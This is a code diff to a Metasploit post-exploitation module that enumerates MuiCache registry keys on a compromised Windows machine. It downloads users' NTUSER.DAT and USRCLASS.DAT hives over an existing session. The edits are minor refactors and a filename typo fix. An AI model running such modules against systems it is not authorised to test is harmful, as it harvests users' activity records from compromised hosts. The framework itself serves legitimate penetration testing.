@@ -50,9 +50,9 @@ class Metasploit3 < Msf::Post
     else
       profile_subkeys.each do |user_sid|
         if user_sid.length > 10
-          user_home_path = registry_getvaldata("HKLM\\Software\\Microsoft\\Windows\ NT\\CurrentVersion\\ProfileList\\#{user_sid}", "ProfileImagePath")
+          user_home_path = registry_getvaldata("#{username_reg_path}\\#{user_sid}", "ProfileImagePath")
           unless user_home_path.blank?
-            full_path = user_home_path.delete("\00")
+            full_path = user_home_path.strip
             usernames << full_path.split("\\").last
             user_homedir_paths << full_path
             user_sids << user_sid
@@ -133,7 +133,7 @@ class Metasploit3 < Msf::Post
     hive_path = user_home_path + hive_file
     ntuser_status = client.fs.file.exists?(hive_path)
     if ntuser_status == true
-      print_status("Downloading #{user}'s NTUSER.DAT/USERCLASS.DAT file..")
+      print_status("Downloading #{user}'s NTUSER.DAT/USRCLASS.DAT file..")
       hive_status = hive_download_status(local_hive_copy, hive_path)
       if hive_status == true
         hive_parser(local_hive_copy, muicache, user, table)
@@ -232,7 +232,8 @@ class Metasploit3 < Msf::Post
     # - http://www.irongeek.com/i.php?page=security/windows-forensics-registry-and-file-system-spots
 
     print_status("Starting to enumerate MuiCache registry keys..")
-    sysnfo = client.sys.config.sysinfo['OS']
+    sysnfo = sysinfo['OS']
+
     if sysnfo =~/(Windows XP)/ and is_admin?
       print_good("Remote system supported: #{sysnfo}")
       muicache = "\\Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache"
